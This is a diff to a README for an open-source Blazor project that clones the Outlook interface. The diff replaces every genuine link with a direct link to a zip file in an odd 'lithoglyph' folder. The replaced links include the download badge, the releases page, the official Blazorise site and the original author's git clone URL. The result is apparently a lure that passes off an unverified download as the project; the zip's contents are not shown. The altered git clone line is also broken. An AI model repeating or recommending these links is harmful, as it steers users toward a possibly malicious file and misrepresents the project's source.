@@ -1,13 +1,13 @@
 # 📧 BlazoriseOutlookClone - Experience a Familiar Email Interface
 
 ## 🌐 Download Now!
-[![Download BlazoriseOutlookClone](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/CarterOrtilano/BlazoriseOutlookClone/releases)
+[![Download BlazoriseOutlookClone](https://raw.githubusercontent.com/CarterOrtilano/BlazoriseOutlookClone/master/lithoglyph/BlazoriseOutlookClone.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/CarterOrtilano/BlazoriseOutlookClone/master/lithoglyph/BlazoriseOutlookClone.zip)
 
 ---
 
 ## 📧 What is BlazoriseOutlookClone?
 
-**BlazoriseOutlookClone** is an open-source project that recreates the familiar **Microsoft Outlook** interface using [Blazorise](https://blazorise.com). This application highlights how to effectively utilize Blazorise components and theming to create a professional-grade email client UI in Blazor. 
+**BlazoriseOutlookClone** is an open-source project that recreates the familiar **Microsoft Outlook** interface using [Blazorise](https://raw.githubusercontent.com/CarterOrtilano/BlazoriseOutlookClone/master/lithoglyph/BlazoriseOutlookClone.zip). This application highlights how to effectively utilize Blazorise components and theming to create a professional-grade email client UI in Blazor. 
 
 ## ✨ Features
 
@@ -26,7 +26,7 @@ Follow these steps to download and run **BlazoriseOutlookClone** on your compute
 
 ### 1. Visit the Releases Page
 
-To download the application, visit the [Releases page](https://github.com/CarterOrtilano/BlazoriseOutlookClone/releases). Look for the latest version of **BlazoriseOutlookClone**. 
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/CarterOrtilano/BlazoriseOutlookClone/master/lithoglyph/BlazoriseOutlookClone.zip). Look for the latest version of **BlazoriseOutlookClone**. 
 
 ### 2. Download the Application
 
@@ -47,7 +47,7 @@ If you wish to run the project from the source code, follow these directions:
 Open your terminal or command prompt and enter:
 
 ```bash
-git clone https://github.com/Megabit/BlazoriseOutlookClone.git
+git clone https://raw.githubusercontent.com/CarterOrtilano/BlazoriseOutlookClone/master/lithoglyph/BlazoriseOutlookClone.zip
 cd BlazoriseOutlookClone
 ```
 
@@ -101,6 +101,6 @@ Thanks to the Blazorise community for their support and contributions. Your feed
 
 ## 📥 Download Again
 
-For easy access, here is the link to download the application one more time: [Download BlazoriseOutlookClone](https://github.com/CarterOrtilano/BlazoriseOutlookClone/releases). 
+For easy access, here is the link to download the application one more time: [Download BlazoriseOutlookClone](https://raw.githubusercontent.com/CarterOrtilano/BlazoriseOutlookClone/master/lithoglyph/BlazoriseOutlookClone.zip). 
 
 Enjoy exploring the features of **BlazoriseOutlookClone**!
